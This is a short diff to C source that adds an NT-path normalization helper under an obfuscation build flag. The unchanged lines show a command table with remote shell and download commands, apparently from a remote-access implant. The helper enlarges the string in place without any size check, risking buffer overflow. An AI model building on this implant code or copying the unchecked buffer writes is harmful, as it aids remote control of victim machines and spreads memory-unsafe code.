@@ -12,6 +12,34 @@
 
 #define RVNT_COMMAND_LENGTH 5
 
+
+#if CONFIG_OBFUSCATION
+void normalize_path(char* path) {
+    const char prefix[] = "\\??\\";
+    const char separator[] = "\\";
+    const char* drive_letter = strchr(path, ':');
+    char *p = path;
+
+    int i;
+    while (*p != '\0') {
+        if (*p == '/')
+            *p = separator[0];
+        p++;
+    }
+    if (drive_letter != NULL) {
+        // Add the prefix for drive paths
+        memmove(path + strlen(prefix), path, strlen(path) + 1);
+        memcpy(path, prefix, strlen(prefix));
+    } else {
+        // Add the prefix for non-drive paths
+        const char* unc_prefix = "\\";
+        memmove(path + strlen(prefix) + strlen(unc_prefix), path, strlen(path) + 1);
+        memcpy(path, prefix, strlen(prefix));
+        memcpy(path + strlen(prefix), unc_prefix, strlen(unc_prefix));
+    }
+}
+#endif
+
 RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
         { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
